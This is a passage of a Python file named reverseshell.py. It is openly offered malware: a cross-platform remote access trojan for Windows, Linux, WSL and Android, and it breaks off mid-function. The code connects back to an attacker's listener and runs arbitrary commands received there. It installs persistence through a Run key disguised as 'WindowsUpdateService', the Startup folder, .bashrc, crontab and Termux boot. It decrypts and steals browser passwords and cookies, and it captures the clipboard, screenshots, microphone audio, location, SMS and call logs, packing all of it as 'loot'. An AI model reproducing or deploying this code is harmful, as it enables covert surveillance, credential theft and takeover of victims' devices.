# language: Python, file: reverseshell.py, target: Cross-platform (Windows, Android, Linux, WSL)
# made by github.com/wrxxnch (Expanded & Fixed)
# use parameter --config to show inputs for host and port
import os
import re
import sys
import shutil
import socket
import subprocess
import threading
import time
import sqlite3
import json
import wave
import urllib.request
from datetime import datetime
from pathlib import Path

# Configurações padrão de conexão
DEFAULT_IP = "127.0.0.1"
DEFAULT_PORT = 4444

CREATE_NO_WINDOW = 0
if os.name == 'nt':
    try:
        CREATE_NO_WINDOW = subprocess.CREATE_NO_WINDOW
    except AttributeError:
        CREATE_NO_WINDOW = 0x08000000

_CACHED_ENDPOINT = None
_ACTIVE_TUNNELS = []
_COMMAND_QUEUE = []
_QUEUE_LOCK = threading.Lock()


def detect_platform():
    """Detecta 'windows', 'android', 'wsl' ou 'linux'."""
    if os.name == 'nt':
        return "windows"
    if os.environ.get("ANDROID_ROOT") or os.path.exists("/system/build.prop") or shutil.which("termux-info"):
        return "android"
    try:
        with open("/proc/version", "r", encoding="utf-8", errors="ignore") as f:
            if "microsoft" in f.read().lower():
                return "wsl"
    except Exception:
        pass
    return "linux"


def _update_source_endpoint(new_ip, new_port):
    """Atualiza DEFAULT_IP e DEFAULT_PORT diretamente no arquivo fonte do script."""
    script_path = Path(os.path.abspath(sys.argv[0]))
    if not script_path.exists() or script_path.suffix.lower() != ".py":
        return False
    content = script_path.read_text(encoding="utf-8")
    updated_ip, n1 = re.subn(
        r'^DEFAULT_IP\s*=\s*["\'][^"\']*["\']',
        f'DEFAULT_IP = "{new_ip}"',
        content,
        count=1,
        flags=re.MULTILINE,
    )
    updated_both, n2 = re.subn(
        r'^DEFAULT_PORT\s*=\s*\d+',
        f'DEFAULT_PORT = {int(new_port)}',
        updated_ip,
        count=1,
        flags=re.MULTILINE,
    )
    if n1 > 0 and n2 > 0:
        script_path.write_text(updated_both, encoding="utf-8")
        return True
    return False


def get_target_endpoint():
    """Se --config for passado, lê IP/Porta interativamente e salva no arquivo; caso contrário usa padrão direto."""
    global _CACHED_ENDPOINT
    if _CACHED_ENDPOINT is not None:
        return _CACHED_ENDPOINT

    target_ip = DEFAULT_IP
    target_port = DEFAULT_PORT
    args = sys.argv[1:]
    config_mode = "--config" in args
    positional = [a for a in args if a != "--config"]

    if config_mode:
        try:
            ip_input = input(f"Digite o IP do Host (Listener) [{target_ip}]: ").strip()
            if ip_input:
                target_ip = ip_input
            port_input = input(f"Digite a Porta [{target_port}]: ").strip()
            if port_input.isdigit():
                target_port = int(port_input)
            _update_source_endpoint(target_ip, target_port)
        except Exception:
            pass
    elif positional:
        arg = positional[0]
        if ":" in arg:
            parts = arg.split(":", 1)
            if parts[0].strip():
                target_ip = parts[0].strip()
            if parts[1].strip().isdigit():
                target_port = int(parts[1].strip())

    _CACHED_ENDPOINT = (target_ip, target_port)
    return _CACHED_ENDPOINT


def _pack_loot(category, ext, payload, target_ip, target_port):
    """Formata pacote binário para /loot/<categoria>/<ip>_<porta>_<data>_<hora>.<extensao>."""
    now = datetime.now()
    stamp = now.strftime("%Y%m%d_%H%M%S")
    clean_ext = ext.lstrip(".")
    rel_path = f"/loot/{category}/{target_ip}_{target_port}_{stamp}.{clean_ext}"
    path_bytes = rel_path.encode('utf-8')
    return len(path_bytes).to_bytes(4, 'big') + path_bytes + len(payload).to_bytes(8, 'big') + payload


def _dpapi_decrypt(blob):
    """Tenta descriptografar DPAPI no Windows; retorna None se não aplicável."""
    if os.name != 'nt' or not isinstance(blob, (bytes, bytearray)) or not blob:
        return None
    try:
        import ctypes
        from ctypes import wintypes

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [
                ("cbData", wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_byte)),
            ]

        in_buf = (ctypes.c_byte * len(blob))(*blob)
        in_blob = DATA_BLOB(len(blob), in_buf)
        out_blob = DATA_BLOB()

        if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(in_blob), None, None, None, None, 0, ctypes.byref(out_blob)
        ):
            raw = ctypes.string_at(out_blob.pbData, out_blob.cbData)
            ctypes.windll.kernel32.LocalFree(out_blob.pbData)
            return raw.decode('utf-8', errors='replace')
    except Exception:
        pass
    return None


def _run_native(cmd_list, timeout=10):
    """Executa comando nativo (inclui shell nativo Android via sh/su se disponível)."""
    plat = detect_platform()
    if plat == "android" and shutil.which("su"):
        joined = " ".join(cmd_list)
        proc = subprocess.run(["su", "-c", joined], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        return proc.stdout + proc.stderr
    kwargs = {}
    if CREATE_NO_WINDOW:
        kwargs["creationflags"] = CREATE_NO_WINDOW
    proc = subprocess.run(cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout, **kwargs)
    return proc.stdout + proc.stderr


def _read_clipboard_full():
    """Lê o conteúdo completo da área de transferência conforme a plataforma."""
    plat = detect_platform()
    if plat == "windows":
        try:
            import tkinter as tk
            root = tk.Tk()
            root.withdraw()
            text = root.clipboard_get()
            root.destroy()
            return text
        except Exception:
            return _run_native(
                ["powershell", "-NoProfile", "-Command", "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; Get-Clipboard -Raw"],
                timeout=8,
            )
    if plat == "android":
        if shutil.which("termux-clipboard-get"):
            return _run_native(["termux-clipboard-get"], timeout=8)
        return _run_native(["cmd", "clipboard", "get"], timeout=8)
    for tool in (["xclip", "-o", "-selection", "clipboard"], ["xsel", "-ob"], ["wl-paste"]):
        if shutil.which(tool[0]):
            return _run_native(tool, timeout=8)
    return ""


def cmd_get_paste(target_ip, target_port):
    """Retorna todo o conteúdo da área de transferência e também salva em /loot/files/."""
    content = _read_clipboard_full()
    if not content:
        return b"[-] Area de transferencia vazia ou indisponivel.\n"
    packed = _pack_loot("files", "txt", content.encode("utf-8", errors="ignore"), target_ip, target_port)
    preview = f"[+] Clipboard completo ({len(content)} chars):\n{content}\n".encode("utf-8", errors="ignore")
    return preview + packed


def cmd_install_reqs(target_ip, target_port):
    """Instala dependências compatíveis com o sistema detectado e registra log em /loot/files/."""
    plat = detect_platform()
    pkgs = ["sounddevice"]
    if plat == "windows":
        pkgs.append("pywin32")
    elif plat == "android":
        pkgs.append("pyjnius")
    log_lines = [f"[*] Plataforma detectada: {plat}"]
    for pkg in pkgs:
        proc = subprocess.run(
            [sys.executable, "-m", "pip", "install", "--quiet", pkg],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        status = "OK" if proc.returncode == 0 else proc.stderr.strip()
        log_lines.append(f"[{'+' if proc.returncode == 0 else '-'}] {pkg}: {status}")
    payload = ("\n".join(log_lines) + "\n").encode("utf-8")
    return _pack_loot("files", "txt", payload, target_ip, target_port)


def persist():
    """Identifica o ambiente e aplica a persistência automaticamente."""
    try:
        current_file = os.path.abspath(sys.argv[0])
        target_ip, target_port = get_target_endpoint()
        cli_arg = f"{target_ip}:{target_port}"
        plat = detect_platform()
        results = []

        if plat == "wsl":
            try:
                win_profile_cmd = subprocess.run(
                    ["cmd.exe", "/c", "echo %USERPROFILE%"],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                )
                if win_profile_cmd.returncode == 0 and win_profile_cmd.stdout.strip():
                    raw_win_path = win_profile_cmd.stdout.strip().replace('\r', '')
                    wsl_win_path = subprocess.run(
                        ["wslpath", "-u", raw_win_path],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
                    ).stdout.strip()
                    if wsl_win_path:
                        startup_folder = os.path.join(
                            wsl_win_path, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
                        )
                        if os.path.exists(startup_folder):
                            file_name = os.path.basename(current_file)
                            destination = os.path.join(startup_folder, file_name)
                            if current_file.lower() != destination.lower():
                                shutil.copyfile(current_file, destination)
                            reg_command = (
                                f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                                f'/v "WindowsUpdateService" /t REG_SZ /d "python \\"{destination}\\" \\"{cli_arg}\\"" /f'
                            )
                            subprocess.run(["cmd.exe", "/c", reg_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            results.append("[+] Persistência no Windows aplicada via WSL!")
            except Exception as wsl_err:
                results.append(f"[-] Aviso WSL->Windows: {str(wsl_err)}")

            home_dir = os.path.expanduser("~")
            bashrc_path = os.path.join(home_dir, ".bashrc")
            python_path = sys.executable
            payload_line = f'\n# Background persistence hook\n{python_path} {current_file} {cli_arg} >/dev/null 2>&1 &\n'
            if os.path.exists(bashrc_path):
                with open(bashrc_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                if current_file not in content:
                    with open(bashrc_path, "a", encoding="utf-8") as f:
                        f.write(payload_line)
                    results.append("[+] Persistência aplicada no .bashrc do WSL!")

        elif plat == "windows":
            appdata = os.environ.get('APPDATA', '')
            if appdata:
                startup_folder = os.path.join(appdata, r"Microsoft\Windows\Start Menu\Programs\Startup")
                file_name = os.path.basename(current_file)
                destination = os.path.join(startup_folder, file_name)
                if current_file.lower() != destination.lower():
                    shutil.copyfile(current_file, destination)
                import winreg
                key = winreg.HKEY_CURRENT_USER
                sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, sub_key, 0, winreg.KEY_SET_VALUE) as reg:
                    winreg.SetValueEx(
                        reg, "WindowsUpdateService", 0, winreg.REG_SZ,
                        f'"{sys.executable}" "{destination}" "{cli_arg}"'
                    )
                results.append("[+] Persistência aplicada no Windows Nativo!")
        elif plat == "android":
            boot_dir = os.path.join(os.path.expanduser("~"), ".termux", "boot")
            os.makedirs(boot_dir, exist_ok=True)
            boot_script = os.path.join(boot_dir, "start_session.sh")
            with open(boot_script, "w", encoding="utf-8") as f:
                f.write(f"#!/data/data/com.termux/files/usr/bin/sh\n{sys.executable} {current_file} {cli_arg} &\n")
            os.chmod(boot_script, 0o755)
            results.append("[+] Persistência aplicada no Android/Termux boot!")
        else:
            python_path = sys.executable
            cron_command = f"@reboot {python_path} {current_file} {cli_arg} &\n"
            process = subprocess.Popen(["crontab", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            current_cron = stdout.decode('utf-8', errors='ignore')
            if current_file not in current_cron:
                new_cron = current_cron + cron_command
                p_in = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                p_in.communicate(input=new_cron.encode('utf-8'))
                results.append("[+] Persistência aplicada no Linux (Crontab)!")

        return "\n".join(results) + "\n"
    except Exception as e:
        return f"[-] Erro ao aplicar persistência: {str(e)}\n"


def _tunnel_worker(host, port):
    """Mantém túnel persistente conectado ao host:porta especificado."""
    while True:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            sock.settimeout(None)
            sock.sendall(f"[TUNNEL_CONNECTED] platform={detect_platform()} endpoint={host}:{port}\n".encode("utf-8"))
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                cmd = chunk.decode("utf-8", errors="ignore").strip()
                if not cmd:
                    continue
                if cmd.lower() == "geoloc":
                    sock.sendall(cmd_geoloc())
                else:
                    out = _run_native(["cmd", "/c", cmd] if detect_platform() == "windows" else ["sh", "-c", cmd])
                    sock.sendall((out or "[+] OK\n").encode("utf-8", errors="ignore"))
        except Exception:
            time.sleep(5)
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


def cmd_connect(arg):
    """Inicia túnel persistente para <host>:<porta>."""
    if not arg or ":" not in arg:
        return b"[-] Uso: connect <host>:<porta>\n"
    host, port_str = arg.strip().split(":", 1)
    if not host.strip() or not port_str.strip().isdigit():
        return b"[-] Formato invalido. Use: connect <host>:<porta>\n"
    port = int(port_str.strip())
    t = threading.Thread(target=_tunnel_worker, args=(host.strip(), port), daemon=True)
    t.start()
    _ACTIVE_TUNNELS.append((host.strip(), port))
    return f"[+] Tunel persistente iniciado para {host.strip()}:{port}\n".encode("utf-8")


def cmd_ls(path="."):
    """Lista arquivos e diretórios detalhadamente."""
    try:
        p = Path(path if path else ".")
        if not p.exists():
            return f"[-] Caminho nao encontrado: {path}\n".encode('utf-8')
        output = []
        for item in p.iterdir():
            mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(item.stat().st_mtime))
            size = item.stat().st_size if item.is_file() else "<DIR>"
            output.append(f"{mtime}\t{str(size):<10}\t{item.name}")
        return ("\n".join(output) + "\n").encode('utf-8', errors='ignore')
    except Exception as e:
        return f"[-] Erro no comando ls: {str(e)}\n".encode('utf-8')


def cmd_screenshot(target_ip, target_port):
    """Captura a tela e envia envelopado para /loot/pictures/<ip>_<porta>_<data>_<hora>.bmp."""
    try:
        temp_path = os.path.join(os.path.expanduser("~"), f"shot_{os.getpid()}.bmp")
        plat = detect_platform()

        if plat == "windows":
            import ctypes
            from ctypes import wintypes

            user32 = ctypes.windll.user32
            gdi32 = ctypes.windll.gdi32
            user32.SetProcessDPIAware()
            width = user32.GetSystemMetrics(0)
            height = user32.GetSystemMetrics(1)

            h_dc = user32.GetDC(0)
            h_mem_dc = gdi32.CreateCompatibleDC(h_dc)
            h_bitmap = gdi32.CreateCompatibleBitmap(h_dc, width, height)
            gdi32.SelectObject(h_mem_dc, h_bitmap)
            gdi32.BitBlt(h_mem_dc, 0, 0, width, height, h_dc, 0, 0, 0x00CC0020 | 0x40000000)

            class BITMAPINFOHEADER(ctypes.Structure):
                _fields_ = [
                    ('biSize', wintypes.DWORD), ('biWidth', wintypes.LONG), ('biHeight', wintypes.LONG),
                    ('biPlanes', wintypes.WORD), ('biBitCount', wintypes.WORD), ('biCompression', wintypes.DWORD),
                    ('biSizeImage', wintypes.DWORD), ('biXPelsPerMeter', wintypes.LONG), ('biYPelsPerMeter', wintypes.LONG),
                    ('biClrUsed', wintypes.DWORD), ('biClrImportant', wintypes.DWORD)
                ]

            bih = BITMAPINFOHEADER()
            bih.biSize = ctypes.sizeof(BITMAPINFOHEADER)
            bih.biWidth = width
            bih.biHeight = -height
            bih.biPlanes = 1
            bih.biBitCount = 24
            bih.biCompression = 0

            buffer_size = width * height * 3
            buffer = ctypes.create_string_buffer(buffer_size)
            gdi32.GetDIBits(h_mem_dc, h_bitmap, 0, height, buffer, ctypes.byref(bih), 0)

            class BITMAPFILEHEADER(ctypes.Structure):
                _fields_ = [
                    ('bfType', wintypes.WORD), ('bfSize', wintypes.DWORD),
                    ('bfReserved1', wintypes.WORD), ('bfReserved2', wintypes.WORD),
                    ('bfOffBits', wintypes.DWORD)
                ]

            bfh = BITMAPFILEHEADER()
            bfh.bfType = 0x4D42
            bfh.bfOffBits = ctypes.sizeof(BITMAPFILEHEADER) + ctypes.sizeof(BITMAPINFOHEADER)
            bfh.bfSize = bfh.bfOffBits + buffer_size

            with open(temp_path, "wb") as f_out:
                f_out.write(bfh)
                f_out.write(bih)
                f_out.write(buffer.raw)

            gdi32.DeleteObject(h_bitmap)
            gdi32.DeleteDC(h_mem_dc)
            user32.ReleaseDC(0, h_dc)
        elif plat == "android":
            _run_native(["screencap", temp_path], timeout=8)
        else:
            for tool in ["scrot", "gnome-screenshot", "import"]:
                if shutil.which(tool):
                    if tool == "scrot":
                        subprocess.run([tool, temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    elif tool == "gnome-screenshot":
                        subprocess.run([tool, "-f", temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    elif tool == "import":
                        subprocess.run([tool, "-window", "root", temp_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    break

        if os.path.exists(temp_path):
            with open(temp_path, "rb") as f:
                file_data = f.read()
            os.remove(temp_path)
            return _pack_loot("pictures", "bmp", file_data, target_ip, target_port)
        return b"[-] Erro: Falha ao gerar arquivo de screenshot.\n"
    except Exception as e:
        return f"[-] Erro ao capturar screenshot: {str(e)}\n".encode('utf-8')


def _collect_cookies():
    """Coleta cookies de bancos SQLite de navegadores suportados."""
    cookies_data = []
    home = os.path.expanduser("~")
    local_app = os.environ.get("LOCALAPPDATA", os.path.join(home, "AppData", "Local"))
    candidates = [
        ("chrome", os.path.join(local_app, r"Google\Chrome\User Data\Default\Network\Cookies")),
        ("chrome", os.path.join(local_app, r"Google\Chrome\User Data\Default\Cookies")),
        ("edge", os.path.join(local_app, r"Microsoft\Edge\User Data\Default\Network\Cookies")),
        ("brave", os.path.join(local_app, r"BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies")),
        ("chrome_linux", os.path.join(home, ".config/google-chrome/Default/Cookies")),
        ("chromium_linux", os.path.join(home, ".config/chromium/Default/Cookies")),
    ]
    for browser, cookie_file in candidates:
        if not os.path.exists(cookie_file):
            continue
        temp_db = os.path.join(home, f"tmp_ck_{os.getpid()}_{browser}.db")
        try:
            shutil.copy2(cookie_file, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, path, is_secure, is_httponly, encrypted_value FROM cookies")
            for host_key, name, path, is_sec, is_http, enc_val in cursor.fetchall():
                plain = _dpapi_decrypt(enc_val)
                val_repr = plain if plain is not None else (enc_val.hex() if isinstance(enc_val, bytes) else str(enc_val))
                cookies_data.append({
                    "browser": browser, "host": host_key, "name": name, "path": path,
                    "secure": bool(is_sec), "httponly": bool(is_http), "value": val_repr,
                })
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass
    return cookies_data


def cmd_download_cookies(target_ip, target_port):
    """Salva cookies em /loot/cookies/<ip>_<porta>_<data>_<hora>.json."""
    payload = json.dumps(_collect_cookies(), indent=2, ensure_ascii=False).encode('utf-8')
    return _pack_loot("cookies", "json", payload, target_ip, target_port)


def cmd_dump_cookies():
    """Retorna cookies em JSON bruto."""
    return (json.dumps(_collect_cookies(), indent=2, ensure_ascii=False) + "\n").encode('utf-8')


def cmd_dump_pass(target_ip, target_port):
    """Extrai credenciais salvas do navegador e envia para /loot/files/<ip>_<porta>_<data>_<hora>.json."""
    creds = []
    home = os.path.expanduser("~")
    local_app = os.environ.get("LOCALAPPDATA", os.path.join(home, "AppData", "Local"))
    login_dbs = [
        ("chrome", os.path.join(local_app, r"Google\Chrome\User Data\Default\Login Data")),
        ("edge", os.path.join(local_app, r"Microsoft\Edge\User Data\Default\Login Data")),
        ("brave", os.path.join(local_app, r"BraveSoftware\Brave-Browser\User Data\Default\Login Data")),
        ("chrome_linux", os.path.join(home, ".config/google-chrome/Default/Login Data")),
        ("chromium_linux", os.path.join(home, ".config/chromium/Default/Login Data")),
    ]
    for browser, db_path in login_dbs:
        if not os.path.exists(db_path):
            continue
        temp_db = os.path.join(home, f"tmp_pw_{os.getpid()}_{browser}.db")
        try:
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc_pw in cursor.fetchall():
                plain_pw = _dpapi_decrypt(enc_pw)
                pw_repr = plain_pw if plain_pw is not None else (enc_pw.hex() if isinstance(enc_pw, bytes) else str(enc_pw))
                creds.append({"browser": browser, "url": url, "username": user, "password": pw_repr})
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except Exception:
                    pass
    payload = json.dumps(creds, indent=2, ensure_ascii=False).encode('utf-8')
    return _pack_loot("files", "json", payload, target_ip, target_port)


def cmd_geoloc():
    """Consulta https://ipinfo.io/json e retorna coordenadas e link do Google Maps."""
    try:
        req = urllib.request.Request("https://ipinfo.io/json", headers={"User-Agent": "curl/8.0"})
        with urllib.request.urlopen(req, timeout=6) as resp:
            info = json.loads(resp.read().decode('utf-8', errors='replace'))

        loc = info.get("loc", "")
        if not loc or "," not in loc:
            return b"[-] Coordenadas nao retornadas pelo ipinfo.io.\n"
        lat, lon = [x.strip() for x in loc.split(",", 1)]
        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
        result = (
            f"[+] IP: {info.get('ip')}\n"
            f"[+] Local: {info.get('city')}, {info.get('region')}, {info.get('country')}\n"
            f"[+] Org: {info.get('org')}\n"
            f"[+] Coordenadas: {lat}, {lon}\n"
            f"[+] Google Maps: {maps_url}\n"
        )
        return result.encode('utf-8', errors='ignore')
    except Exception as e:
        return f"[-] Erro no geoloc (ipinfo.io): {str(e)}\n".encode('utf-8')


def cmd_recent_maps(target_ip, target_port):
    """Extrai pesquisas recentes do Google Maps de bancos SQLite/histórico e envia para /loot/files/."""
    entries = []
    home = os.path.expanduser("~")
    local_app = os.environ.get("LOCALAPPDATA", os.path.join(home, "AppData", "Local"))
    hist_paths = [
        ("chrome_win", os.path.join(local_app, r"Google\Chrome\User Data\Default\History")),
        ("edge_win", os.path.join(local_app, r"Microsoft\Edge\User Data\Default\History")),
        ("chrome_lin", os.path.join(home, ".config/google-chrome/Default/History")),
    ]
    for src, hpath in hist_paths:
        if not os.path.exists(hpath):
            continue
        tmp_h = os.path.join(home, f"tmp_hist_{os.getpid()}_{src}.db")
        try:
            shutil.copy2(hpath, tmp_h)
            conn = sqlite3.connect(tmp_h)
            cur = conn.cursor()
            cur.execute("SELECT url, title, last_visit_time FROM urls WHERE url LIKE '%google.com/maps%' OR url LIKE '%maps.google%'")
            for url, title, visit_ts in cur.fetchall():
                entries.append({"source": src, "title": title, "url": url, "visit_time": visit_ts})
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(tmp_h):
                try:
                    os.remove(tmp_h)
                except Exception:
                    pass
    payload = json.dumps(entries, indent=2, ensure_ascii=False).encode('utf-8')
    return _pack_loot("files", "json", payload, target_ip, target_port)


def cmd_record_mic(arg, target_ip, target_port):
    """Grava áudio do microfone e envia para /loot/audio/<ip>_<porta>_<data>_<hora>.wav."""
    try:
        seconds = int(arg.strip()) if arg and arg.strip().isdigit() else 5
        seconds = max(1, min(seconds, 60))
        sample_rate = 16000
        channels = 1
        plat = detect_platform()
        temp_wav = os.path.join(os.path.expanduser("~"), f"mic_{os.getpid()}.wav")
        recorded = False

        try:
            import sounddevice as sd
            audio_data = sd.rec(int(seconds * sample_rate), samplerate=sample_rate, channels=channels, dtype='int16')
            sd.wait()
            with wave.open(temp_wav, "wb") as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(2)
                wf.setframerate(sample_rate)
                wf.writeframes(audio_data.tobytes())
            recorded = True
        except Exception:
            pass

        if not recorded and plat == "android" and shutil.which("termux-microphone-record"):
            subprocess.run(["termux-microphone-record", "-f", temp_wav, "-l", str(seconds)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(seconds + 1)
            subprocess.run(["termux-microphone-record", "-q"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            recorded = os.path.exists(temp_wav) and os.path.getsize(temp_wav) > 0

        if not recorded and shutil.which("arecord"):
            subprocess.run(
                ["arecord", "-q", "-d", str(seconds), "-f", "S16_LE", "-r", str(sample_rate), "-c", str(channels), temp_wav],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=seconds + 5
            )
            recorded = os.path.exists(temp_wav) and os.path.getsize(temp_wav) > 0

        if not recorded and shutil.which("ffmpeg"):
            inp = ["-f", "dshow", "-i", "audio=Microphone"] if plat == "windows" else ["-f", "alsa", "-i", "default"]
            subprocess.run(
                ["ffmpeg", "-y", "-loglevel", "quiet", *inp, "-t", str(seconds), "-ac", str(channels), "-ar", str(sample_rate), temp_wav],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=seconds + 5
            )
            recorded = os.path.exists(temp_wav) and os.path.getsize(temp_wav) > 0

        if not recorded or not os.path.exists(temp_wav):
            return b"[-] Erro: Nenhum backend de audio disponivel. Rode install_reqs.\n"

        with open(temp_wav, "rb") as f:
            wav_bytes = f.read()
        try:
            os.remove(temp_wav)
        except Exception:
            pass
        return _pack_loot("audio", "wav", wav_bytes, target_ip, target_port)
    except Exception as e:
        return f"[-] Erro no record_mic: {str(e)}\n".encode('utf-8')


def cmd_gps_logging(arg, target_ip, target_port):
    """Coleta posição GPS/rede atual e salva em /loot/files/<ip>_<porta>_<data>_<hora>.json."""
    samples = int(arg.strip()) if arg and arg.strip().isdigit() else 1
    samples = max(1, min(samples, 20))
    plat = detect_platform()
    logs = []
    for _ in range(samples):
        entry = {"ts": datetime.now().isoformat(), "platform": plat}
        if plat == "android" and shutil.which("termux-location"):
            raw = _run_native(["termux-location", "-p", "gps"], timeout=10)
            entry["android_location"] = raw.strip()
        else:
            geo_txt = cmd_geoloc().decode("utf-8", errors="ignore")
            entry["ipinfo"] = geo_txt.strip()
        logs.append(entry)
        if samples > 1:
            time.sleep(1)
    payload = json.dumps(logs, indent=2, ensure_ascii=False).encode("utf-8")
    return _pack_loot("files", "json", payload, target_ip, target_port)


def cmd_view_contacts(target_ip, target_port):
    """Lista contatos no Android/Windows e salva em /loot/files/."""
    plat = detect_platform()
    if plat == "android":
        raw = _run_native(["content", "query", "--uri", "content://contacts/phones/", "--projection", "display_name:number"])
    else:
        raw = _run_native(["powershell", "-NoProfile", "-Command", "Get-LocalUser | Select-Object Name,Enabled | ConvertTo-Json"])
    return _pack_loot("files", "txt", raw.encode("utf-8", errors="ignore"), target_ip, target_port)


def cmd_sms_logs(target_ip, target_port):
    """Lê mensagens SMS via content provider no Android ou retorna status no desktop."""
    plat = detect_platform()
    raw = _run_native(["content", "query", "--uri", "content://sms/", "--projection", "address:body:date"]) if plat == "android" else "[-] SMS logs aplicavel apenas a Android.\n"
    return _pack_loot("files", "txt", raw.encode("utf-8", errors="ignore"), target_ip, target_port)


def cmd_send_sms(arg):
    """Envia SMS via shell nativo Android (<numero> <mensagem>)."""
    if detect_platform() != "android":
        return b"[-] send_sms disponivel apenas em Android.\n"
    parts = arg.strip().split(" ", 1)
    if len(parts) < 2:
        return b"[-] Uso: send_sms <numero> <mensagem>\n"
    out = _run_native(["service", "call", "isms", "5", "s16", "com.android.mms.service", "s16", parts[0], "s16", "", "s16", parts[1], "s16", "", "s16", ""])
    return (out or "[+] Comando SMS enviado.\n").encode("utf-8", errors="ignore")


def cmd_call_logs(target_ip, target_port):
    """Lê histórico de chamadas no Android."""
    plat = detect_platform()
    raw = _run_native(["content", "query", "--uri", "content://call_log/calls", "--projection", "number:type:duration:date"]) if plat == "android" else "[-] call_logs aplicavel apenas a Android.\n"
    return _pack_loot("files", "txt", raw.encode("utf-8", errors="ignore"), target_ip, target_port)


def cmd_view_installed_apps(target_ip, target_port):
    """Lista aplicativos instalados no sistema alvo."""
    plat = detect_platform()
    if plat == "android":
        raw = _run_native(["pm", "list", "packages", "-3"])
    elif plat == "windows":
        raw = _run_native(["powershell", "-NoProfile", "-Command", "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*,HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -ErrorAction SilentlyContinue | Select-Object DisplayName,DisplayVersion | ConvertTo-Json"])
    else:
        raw = _run_native(["sh", "-c", "dpkg -l 2>/dev/null || rpm -qa 2>/dev/null || ps -eo comm"])
    return _pack_loot("files", "txt", raw.encode("utf-8", errors="ignore"), target_ip, target_port)


def cmd_view_stub_permissions(target_ip, target_port):
    """Inspeciona permissões do processo/stub atual."""
    plat = detect_platform()
    info = {
        "platform": plat,
        "pid": os.getpid(),
        "uid": os.getuid() if hasattr(os, "getuid") else None,
        "cwd": os.getcwd(),
        "env_keys": sorted(list(os.environ.keys())),
    }
    if plat == "android":
        info["dumpsys_package"] = _run_native(["dumpsys", "package", "com.termux"])[:4000]
    return _pack_loot("files", "json", json.dumps(info, indent=2, ensure_ascii=False).encode("utf-8"), target_ip, target_port)


def cmd_live_clipboard_logging(arg, target_ip, target_port):
    """Monitora área de transferência por N segundos (padrão 5s) e salva em /loot/files/."""
    dur = int(arg.strip()) if arg and arg.strip().isdigit() else 5
    dur = max(1, min(dur, 60))
    snapshots = []
    deadline = time.time() + dur
    last_val = None
    while time.time() < deadline:
        val = (_read_clipboard_full() or "").strip()
        if val != last_val:
            snapshots.append({"ts": datetime.now().isoformat(), "content": val})
            last_val = val
        time.sleep(0.5)
    return _pack_loot("files", "json", json.dumps(snapshots, indent=2, ensure_ascii=False).encode("utf-8"), target_ip, target_port)


def cmd_live_notification_logging(arg, target_ip, target_port):
    """Captura notificações ativas/recentes e salva em /loot/files/."""
    dur = int(arg.strip()) if arg and arg.strip().isdigit() else 3
    dur = max(1, min(dur, 30))
    plat = detect_platform()
    records = []
    for _ in range(dur):
        if plat == "android":
            records.append({"ts": datetime.now().isoformat(), "dump": _run_native(["dumpsys", "notification", "--noredacted"])[:3000]})
        elif plat == "windows":
            records.append({"ts": datetime.now().isoformat(), "info": "Windows toast notifications require UWP listener"})
        else:
            records.append({"ts": datetime.now().isoformat(), "info": "Linux notification daemon check"})
        time.sleep(1)
    return _pack_loot("files", "json", json.dumps(records, indent=2, ensure_ascii=False).encode("utf-8"), target_ip, target_port)


def cmd_view_wifi_networks(target_ip, target_port):
    """Lista redes Wi-Fi conhecidas/histórico e salva em /loot/files/."""
    plat = detect_platform()
    if plat == "windows":
        raw = _run_native(["netsh", "wlan", "show", "profiles"])
    elif plat == "android":
        raw = _run_native(["dumpsys", "wifi"])
    else:
        raw = _run_native(["sh", "-c", "nmcli dev wifi list 2>/dev/null || cat /etc/NetworkManager/system-connections/* 2>/dev/null || true"])
    return _pack_loot("files", "txt", raw.encode("utf-8", errors="ignore"), target_ip, target_port)


def cmd_file_explorer_and_downloader(arg, target_ip, target_port):
